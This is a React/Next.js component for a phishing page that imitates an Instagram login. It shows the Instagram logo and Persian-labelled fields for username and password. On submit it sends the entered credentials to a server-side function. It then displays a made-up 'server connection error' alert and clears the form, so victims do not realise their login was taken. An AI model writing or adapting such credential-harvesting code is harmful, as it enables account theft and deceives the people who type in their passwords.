"use client";

import { createNewData } from "@/actions/actions";
import { FormEvent, useState } from "react";
import Image from "next/image";
import InstagramLogo from "@/public/instagram-logo.png";

const SaveForm = () => {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");

    const ShowInformation = async (e: FormEvent<HTMLButtonElement>) => {
        e.preventDefault();

        createNewData({ password, username });

        setTimeout(() => {
            alert("خطای ارتباط با سرور، لطفا اینترنت خود را چک کنید")

            setUsername("")
            setPassword("")
        }, 500);
    }

    return (
        <div className="border rounded-lg text-center mx-auto max-w-xl p-6 bg-white">
            <div className="mb-6">
                <Image
                    src={InstagramLogo}
                    alt="instagram"
                    title="instagram"
                    width={60}
                    height={60}
                    className="inline-block"
                />
            </div>
            <form>
                <div className="mb-6">
                    <label className="block" htmlFor="username">
                        یوزرنیم اینستاگرام
                    </label>
                    <input
                        className="border rounded-lg bg-slate-200 py-1 px-3"
                        dir="ltr"
                        type="text"
                        name="username"
                        onChange={(e) => setUsername(e.target.value)}
                        value={username}
                    />
                </div>
                <div className="mb-6">
                    <label className="block" htmlFor="password">
                        پسورد اینستاگرام
                    </label>
                    <input
                        className="border rounded-lg bg-slate-200 py-1 px-3"
                        type="text"
                        name="password"
                        dir="ltr"
                        onChange={(e) => setPassword(e.target.value)}
                        value={password}
                    />
                </div>
                <div className="mb-0">
                    <button
                        type="submit"
                        className="rounded-md bg-teal-700 text-white py-2 px-4"
                        onClick={ShowInformation}
                    >
                        ثبت و ارسال اطلاعات
                    </button>
                </div>
            </form>
        </div>
    )
}

export default SaveForm